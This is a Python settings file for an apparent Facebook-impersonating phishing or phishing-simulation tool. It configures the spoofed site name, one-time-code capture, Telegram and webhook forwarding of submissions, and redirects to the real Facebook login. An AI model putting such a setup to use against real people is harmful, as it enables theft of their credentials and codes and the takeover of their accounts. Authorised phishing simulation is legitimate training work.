import os
SITE_NAME       = os.environ.get("SITE_NAME", "Facebook")
ADMIN_USER      = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS      = os.environ.get("PHISHSIM_PW", "trainme")
SECRET_KEY      = os.environ.get("SECRET_KEY", "change-me-in-prod-" + os.urandom(8).hex())
DATABASE_URL    = os.environ.get("DATABASE_URL", "")
DB_PATH         = os.environ.get("DB_PATH", "data.db")
TG_TOKEN        = os.environ.get("TG_TOKEN", "")
TG_CHAT_ID      = os.environ.get("TG_CHAT_ID", "")
WEBHOOK_URL     = os.environ.get("WEBHOOK_URL", "")
ENABLE_OTP      = os.environ.get("ENABLE_OTP", "1") == "1"
TRUSTED_PROXIES = {"127.0.0.1", "::1"}
REDIRECT_URL    = os.environ.get("REDIRECT_URL", "https://www.facebook.com/login")
REDIRECT_OTP_URL = os.environ.get("REDIRECT_OTP_URL", "https://www.facebook.com/")
